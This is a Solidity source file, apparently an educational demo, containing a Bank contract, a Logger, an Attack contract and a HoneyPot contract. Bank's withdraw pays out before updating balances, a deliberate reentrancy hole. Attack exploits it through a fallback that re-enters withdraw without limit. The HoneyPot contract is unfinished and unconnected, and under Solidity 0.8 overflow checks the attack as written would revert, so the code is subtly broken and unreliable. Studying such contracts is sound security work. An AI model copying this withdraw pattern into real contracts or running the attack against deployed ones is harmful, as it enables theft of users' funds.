pragma solidity ^0.8.13;

contract Bank {
   mapping(address => uint) public balances;
   Logger public logger;

   constructor(Logger _logger) {
      logger = _logger;
   }

   function deposit() public payable {
      balances[msg.sender] += msg.value;
      logger.log(msg.sender, msg.value);
   }

   function withdraw(uint _amount) public {
      require(balances[msg.sender] >= _amount, "Insufficient balance");
      (bool success, ) = msg.sender.call{value: _amount}("");
      require(success, "Transfer failed");
      balances[msg.sender] -= _amount;
   }
}

contract Logger {
   event Log(address indexed sender, uint amount);

   function log(address _sender, uint _amount) public {
      emit Log(_sender, _amount);
   }
}

contract Attack {
   Bank public bank;

   constructor(Bank _bank) {
      bank = Bank(_bank);
   }

   function attack() public payable {
      bank.deposit{value: msg.value}();
      bank.withdraw(msg.value);
   }

   fallback() external payable {
      bank.withdraw(bank.balances(address(this)));
   }
}

contract HoneyPot {
   mapping(address => uint) public balances;

   function log(address _sender, uint _amount) public {
      balances[_sender] += _amount;
   }

   function equal(uint _a, uint _b) public pure returns (bool) {
      return _a == _b;
   }
}
